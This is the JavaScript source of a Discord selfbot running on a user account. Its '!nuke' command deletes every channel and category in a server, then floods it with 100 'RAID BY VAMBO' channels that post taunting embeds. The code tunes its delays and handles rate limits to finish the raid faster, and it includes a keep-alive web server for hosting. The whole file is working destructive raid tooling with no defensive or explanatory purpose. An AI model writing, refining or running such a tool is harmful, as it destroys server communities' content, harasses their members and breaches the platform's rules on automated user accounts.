const { Client, EmbedBuilder } = require('discord.js-selfbot-v13');
const client = new Client();

// Use environment variable for security
const TOKEN = process.env.DISCORD_TOKEN;
const PREFIX = '!';

// Web server for Railway
const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
    res.send('Nuke selfbot with embeds is running!');
});

app.listen(PORT, () => {
    console.log(`Web server running on port ${PORT}`);
});

// ===== BEAUTIFUL EMBED TEMPLATES =====

// Create raid embed with VAMBO theme
function createRaidEmbed(channelNumber) {
    // Blood red color for the embed
    const bloodRed = 0x8B0000;
    const darkRed = 0x5A0E0E;
    
    const embed = new EmbedBuilder()
        .setTitle('🔥 **RAIDED BY VAMBO** 🔥')
        .setDescription(`
### NEVER SCAM AGAIN SON 😂
        😯 KICK ROCKS 😯

**You've been hit by the VAMBO train!**
        `)
        .setColor(channelNumber % 2 === 0 ? bloodRed : darkRed) // Alternate colors
        .setImage('https://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif')
        .setThumbnail('https://media.discordapp.net/attachments/123456789/your-thumbnail.gif') // Optional
        .setFooter({ 
            text: `VAMBO RAID • Channel ${channelNumber}/100 • Get wrecked`, 
            iconURL: 'https://cdn.discordapp.com/emojis/123456789.gif' // Optional
        })
        .setTimestamp();
    
    return embed;
}

// Create warning embed for announcements
function createWarningEmbed(title, description, color = 0xFFA500) {
    return new EmbedBuilder()
        .setTitle(`⚠️ ${title} ⚠️`)
        .setDescription(description)
        .setColor(color)
        .setTimestamp();
}

// Create success embed for progress
function createSuccessEmbed(title, description) {
    return new EmbedBuilder()
        .setTitle(`✅ ${title}`)
        .setDescription(description)
        .setColor(0x00FF00)
        .setTimestamp();
}

// Helper function to send messages safely
async function safeSend(channel, content) {
    try {
        if (channel && !channel.deleted) {
            await channel.send(content);
        }
    } catch (error) {
        // Silently ignore errors - channel probably got deleted
    }
}

client.on('ready', () => {
    console.log(`✅ Logged in as ${client.user.tag}`);
    console.log(`Selfbot is ready in ${client.guilds.cache.size} servers`);
    console.log(`Type !nuke in any channel to destroy the server with EMBEDS!`);
});

client.on('messageCreate', async (message) => {
    // Only respond to your own messages
    if (message.author.id !== client.user.id) return;
    if (!message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // ===== FULL NUKE COMMAND =====
    if (command === 'nuke') {
        const guild = message.guild;
        const originalChannel = message.channel;
        
        if (!guild) {
            await safeSend(originalChannel, 'This command only works in servers!');
            return;
        }

        console.log(`💣 Starting nuke on ${guild.name}`);
        
        // Send fancy embed confirmation
        await safeSend(originalChannel, { 
            embeds: [createWarningEmbed(
                'NUKE INITIATED', 
                `**Target:** ${guild.name}\n**Phase 1:** Deleting ALL channels...\n**Phase 2:** Creating 100 raid channels with embeds!\n**Estimated time:** 2-3 minutes`,
                0xFF0000
            )] 
        });

        // ===== STEP 1: DELETE ALL CHANNELS =====
        let deletedCount = 0;
        let deleteFailed = 0;
        
        // Get all channels and sort them
        const channels = [...guild.channels.cache.values()];
        
        // Delete non-category channels first
        const nonCategoryChannels = channels.filter(c => c.type !== 'GUILD_CATEGORY');
        const categoryChannels = channels.filter(c => c.type === 'GUILD_CATEGORY');
        
        // Delete non-category channels (faster - 400ms delay instead of 800ms)
        for (const channel of nonCategoryChannels) {
            try {
                await channel.delete();
                deletedCount++;
                console.log(`✅ Deleted: ${channel.name}`);
                await new Promise(resolve => setTimeout(resolve, 400)); // Faster deletion
            } catch (error) {
                deleteFailed++;
                console.log(`❌ Failed to delete ${channel.name}: ${error.message}`);
            }
        }
        
        // Delete categories
        for (const channel of categoryChannels) {
            try {
                await channel.delete();
                deletedCount++;
                console.log(`✅ Deleted category: ${channel.name}`);
                await new Promise(resolve => setTimeout(resolve, 400)); // Faster deletion
            } catch (error) {
                deleteFailed++;
                console.log(`❌ Failed to delete category ${channel.name}: ${error.message}`);
            }
        }
        
        console.log(`✅ Phase 1 complete: Deleted ${deletedCount} channels`);

        // ===== STEP 2: CREATE 100 RAID CHANNELS WITH EMBEDS =====
        console.log(`🔥 Creating 100 raid channels with EMBEDS...`);
        
        // Channel name with Zalgo text
        const channelName = 'R҉A҉I҉D҉-҉B҉Y҉-҉V҉A҉M҉B҉O҉';
        
        let createdCount = 0;
        let createFailed = 0;

        // Create 100 channels (faster - 800ms delay instead of 1200ms)
        for (let i = 1; i <= 100; i++) {
            try {
                // Create channel
                const newChannel = await guild.channels.create(`${channelName}-${i}`, {
                    type: 'text'
                });
                
                // Send BEAUTIFUL EMBED in the new channel
                await newChannel.send({ 
                    embeds: [createRaidEmbed(i)] 
                });
                
                createdCount++;
                console.log(`✅ Created channel ${i}/100 with embed`);
                
                // Log progress every 10 channels
                if (i % 10 === 0) {
                    console.log(`📊 Progress: ${i}/100 channels created`);
                }
                
                // Faster delay (800ms instead of 1200ms)
                await new Promise(resolve => setTimeout(resolve, 800));
                
            } catch (error) {
                createFailed++;
                console.log(`❌ Failed to create channel ${i}: ${error.message}`);
                
                // If rate limited, wait longer
                if (error.message.includes('rate')) {
                    console.log('⏳ Rate limited, waiting 3 seconds...');
                    await new Promise(resolve => setTimeout(resolve, 3000));
                }
            }
        }

        // ===== NO FINAL CHANNEL =====
        // Just log to console instead of creating another channel
        console.log('='.repeat(50));
        console.log('💀 **NUKE COMPLETE** 💀');
        console.log(`✅ Deleted: ${deletedCount} channels`);
        console.log(`✅ Created: ${createdCount} raid channels with EMBEDS`);
        console.log(`❌ Delete failures: ${deleteFailed}`);
        console.log(`❌ Create failures: ${createFailed}`);
        console.log('='.repeat(50));
        
        console.log(`🔥 All 100 channels created with beautiful VAMBO embeds! No final channel created.`);
    }
});

client.login(TOKEN);
